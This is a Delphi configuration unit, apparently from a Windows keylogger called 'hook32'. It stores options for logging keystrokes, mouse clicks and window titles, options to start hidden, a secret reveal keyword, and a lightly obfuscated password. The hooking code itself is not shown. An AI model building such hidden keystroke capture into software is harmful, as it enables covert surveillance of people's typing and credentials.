unit global;

interface
uses IniFiles,SysUtils,Registry;

Const Version = 2*256+08;

var
  logName: String = '_Hook.hk3';
  Hiden: boolean = False;
  KeyWord:String = 'SHOWHOOK';
  MySecret:String[20]='JQKSTQ::)'{'IOHOOK32'};

type TKeyRecord = (krBasic,krMain,krAll,krCrazy,kr5,kr6,kr7);

var  KeyRecord:TKeyRecord=krMain;
     RecordKeyUp:boolean=False;
     RecordMouseClick:boolean=true;
     RecSubWindowTitle:boolean=true;
     RecKBDLayout:boolean=true;
     RecTime:boolean=False;

     StartHide:boolean=False;
var
  IniF: TIniFile;
{  var Registry:TRegistry;}


implementation ///////////////////////////////////////////////////////
var i:byte;

initialization
  {Registry:=TRegistry.Create;}
  {StartDir:=ExtractFileDir(ParamStr(0));
  ChangeFileExt(ParamStr(0),'.INI')}

  IniF := TIniFile.Create({StartDir+'\hook32.INI'}ChangeFileExt(ParamStr(0),'.INI'));
  IniF.WriteString('Over', 'LastStart', DateTimeToStr(Now));
  logName:=IniF.ReadString('LogFile', 'FileName', logName);
  KeyRecord:=TKeyRecord(IniF.ReadInteger('Keys', 'KeyRecord', Integer(KeyRecord)));
  RecordKeyUp:=Boolean(IniF.ReadInteger('Keys', 'RecordKeyUp', Integer(RecordKeyUp)));
  RecordMouseClick:=Boolean(IniF.ReadInteger('Keys', 'RecordMouseClick', Integer(RecordMouseClick)));

  RecSubWindowTitle:=Boolean(IniF.ReadInteger('RecAddInf', 'RecSubWindowTitle', Integer(RecSubWindowTitle)));
  RecKBDLayout:=Boolean(IniF.ReadInteger('RecAddInf', 'RecKBDLayout', Integer(RecKBDLayout)));
  RecTime:=Boolean(IniF.ReadInteger('RecAddInf', 'RecTime', Integer(RecTime)));

  KeyWord:=IniF.ReadString('StartUp', 'KeyWord', KeyWord);
  StartHide:=Boolean(IniF.ReadInteger('StartUp', 'StartHide', Integer(StartHide)));

  for i:=0 to length(MySecret) do Byte(MySecret[i]):=byte(MySecret[i])-i;
finalization
  IniF.WriteString('LogFile', 'FileName', logName);
  IniF.WriteInteger('Keys', 'KeyRecord', Integer(KeyRecord));
  IniF.WriteInteger('Keys', 'RecordKeyUp', Integer(RecordKeyUp));
  IniF.WriteInteger('Keys', 'RecordMouseClick', Integer(RecordMouseClick));

  IniF.WriteInteger('RecAddInf', 'RecSubWindowTitle', Integer(RecSubWindowTitle));
  IniF.WriteInteger('RecAddInf', 'RecKBDLayout', Integer(RecKBDLayout));
  IniF.WriteInteger('RecAddInf', 'RecTime', Integer(RecTime));

  IniF.WriteString('StartUp', 'KeyWord', KeyWord);
  IniF.WriteInteger('StartUp', 'StartHide', Integer(StartHide));

  IniF.Free;
end.
